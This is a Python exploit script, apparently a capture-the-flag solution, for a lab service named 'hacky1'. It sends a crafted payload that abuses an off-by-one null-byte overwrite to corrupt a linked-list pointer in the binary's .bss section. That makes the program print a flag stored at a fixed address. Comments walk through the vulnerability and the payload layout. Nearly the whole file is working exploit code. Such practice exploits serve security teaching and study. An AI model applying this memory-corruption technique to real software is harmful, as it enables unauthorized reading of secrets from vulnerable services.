#!/usr/bin/python3

import sys
import socket
import time
from pwn import p64

#NOTE: relevant non-boilerplate code starts at line 77

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13703

s = socket.socket()
s.connect((host, port))


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)

#The first input determines the offset at which the head of our linked list is stored within buf.
recv_until(b':')
send(b"0\n")

#The second gets reads the content into head->data.imm, which is a statically allocated char array 
#  and provides 160 bytes of space.
#The length restriction parameter l of the get function is set to sizeof(head->data.imm), which also 
#  equals 160.
#However, the get function is coded in such a way, that the (l+1)th byte is set to 0 to terminate the
#  string, if the input is l byte long.
#This causes a partial override of head->next, which is placed in memory directly behind the buffer.
#As long as the last byte of the address has not been 0 in the first place, this basically shifts the
#  head->next reference in memory by a certain number of bytes, causing an overlap of the memory 
#  region of the first node and the region interpreted as the second node.
#Since buf is a statically allocated global variable it does not live on the stack or heap, but in 
#  the binaries .bss section, the address of which is not affected by ASLR, system specific environment
#  variables or the like, which makes it very easy to determine the exact number of bytes we shift the
#  second node by, for any given offset entered in the first step.
#For the offset 0 we chose as the input in the first step, the offset is exactly 144 bytes, since the
#  initial address stored in head->next ends in 0x90.
#Hence the second node is assummed to start at head+32 once the partial override has occured.
#The first 8 byte of head are covered by the bool is_ptr variable, followed by our input. Starting at 
#  byte 24 of our input, we can thur arbitrarily override the head->next node.
#
#In order to get a flag, we have to make use of the fact, that the get_flag() function has already 
#  written a flag to a global buffer called flag, that is also statically allocated and hence lives 
#  in the .bss section as well.
#Since the linked list uses the boolean is_ptr to determine, wether a pointer to a string or an 
#  immediate value is stored in the union data, we have to set any or all of bytes 25 to 32 of our
#  input to a non-zero value, in order to have bytes 33 to 40 interpreted as a pointer to a string.
#If we now write the address of the flag in memory (0x4034e0) to bytes 25 to 32 of the input, the 
#  flag will be printed to stdout. Yay!
recv_until(b':')
send(b"I'm some irrelevant str\x00" + b"IMABOOL!" + p64(0x4034e0) + 120*b"\x00")
dbg_print(recv_until(b'\n'))
print(recv_until(b'\n').decode())


